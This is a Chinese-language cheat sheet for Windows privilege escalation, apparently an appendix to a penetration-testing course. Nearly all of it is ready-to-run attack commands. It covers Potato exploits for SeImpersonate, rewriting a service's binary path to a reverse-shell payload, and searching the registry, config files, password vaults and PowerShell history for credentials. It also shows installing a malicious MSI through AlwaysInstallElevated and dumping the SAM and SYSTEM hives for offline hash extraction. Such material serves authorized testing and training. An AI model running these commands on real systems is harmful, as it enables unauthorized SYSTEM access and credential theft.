# 速查：Windows 提權

> 原理看 [Ch 25](../25-windows-privesc-methodology.md)–[Ch 29](../29-windows-enum-tools.md)。LOLBAS：lolbas-project.github.io

## 枚舉清單

```cmd
whoami /priv                   :: ← 金礦在這
whoami /groups
systeminfo                     :: OS 版本/修補（給 WES-NG）
net user; net localgroup administrators
ipconfig /all; netstat -ano
:: 服務
sc query; wmic service get name,pathname,startmode
:: 排程
schtasks /query /fo LIST /v
```

```powershell
# PowerShell 枚舉
Get-LocalUser; Get-LocalGroupMember Administrators
Get-Process; Get-Service
```

## 權限 → 手法對照

| `whoami /priv` 看到 | 手法 |
|----|----|
| **SeImpersonatePrivilege** | PrintSpoofer / GodPotato → SYSTEM（服務帳號必試） |
| **SeBackupPrivilege** | 抄 SAM+SYSTEM 離線抽 hash |
| SeRestore / SeTakeOwnership | 覆寫受保護檔案 |
| SeLoadDriver | 載入惡意驅動 |

## Potato（SeImpersonate）

```cmd
PrintSpoofer64.exe -i -c cmd
GodPotato -cmd "cmd /c whoami"
:: 輸出 nt authority\system = 成功
```

## 服務濫用

```cmd
:: 1) unquoted service path
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
:: 空白+無引號路徑 → 放 C:\Program.exe

:: 2) 可寫服務執行檔 → 換成你的 payload
:: 3) 可改服務設定
sc config <svc> binpath= "C:\Windows\Temp\rev.exe"
sc stop <svc> & sc start <svc>
:: 用 accesschk 確認權限
accesschk.exe /accepteula -uwcqv user <svc>
```

## 憑證搜尋（高頻）

```cmd
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
:: autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: 檔案
dir /s /b C:\*unattend.xml C:\*web.config C:\*.kdbx
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
:: PuTTY / VNC / WinSCP registry
```

## AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 兩個都 =1 →
msiexec /quiet /qn /i evil.msi
```

## 抽 hash（本機）

```cmd
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save
:: Kali：impacket-secretsdump -sam sam.save -system system.save LOCAL
```

## 自動化

```cmd
winPEAS.exe
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
Seatbelt.exe -group=all
:: systeminfo → WES-NG 找 kernel exploit（最後手段）
```

## 鐵律
- `whoami /priv` 看到 SeImpersonate → 直接 Potato
- 32-bit shell 看不到真 System32 → 用 `C:\Windows\Sysnative\`
- 提權常靠「撿到的密碼」，翻遍設定檔/registry/history
